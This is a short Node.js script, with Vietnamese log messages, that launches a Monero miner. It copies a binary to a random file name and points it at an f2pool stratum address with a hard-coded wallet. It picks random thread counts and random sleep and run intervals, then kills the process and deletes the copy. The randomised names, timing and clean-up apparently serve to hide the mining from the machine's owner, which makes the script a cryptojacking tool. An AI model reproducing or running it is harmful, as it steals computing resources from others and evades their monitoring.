'use strict'
const shell = require('shelljs');
const { printLog } = require('./log-print');

const nameTool = Math.random().toString(36).substring(7);

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const runJob = (nameTool) => {
    const coreNumber = Math.floor(Math.random() * 5) + 8;
    const runMonney = shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${ coreNumber } --astrobwt-avx2`, { silent: true, async: true });
    if (runMonney.code !== undefined) {
        return 0;
    }
    runMonney.stdout.on('data', (rawLog) => {
        printLog(rawLog);
    });
    console.log(`-- dang tien hanh jobs voi ${ coreNumber } core`);
}

const run = async () => {
    try {
        const timeSleepJobs = ((Math.floor(Math.random() * 2) + 1) * 60) * 1000;
        console.log(`-- task nghi trong ${((timeSleepJobs / 60) / 1000)} phut`);
        await timeout(timeSleepJobs);

        if (shell.exec(`cp runtool ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- tao file moi thanh cong');
            runJob(nameTool);
        }

        const timeRunJobs = ((Math.floor(Math.random() * 15) + 20) * 60) * 1000;
        console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);
        await timeout(timeRunJobs);
        if (shell.exec(`killall ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- ket thuc jobs');
            shell.exec(`rm -rf ${nameTool}`, { silent: true })
        }
    } catch (error) {
        console.log(error);
    }

}
run();
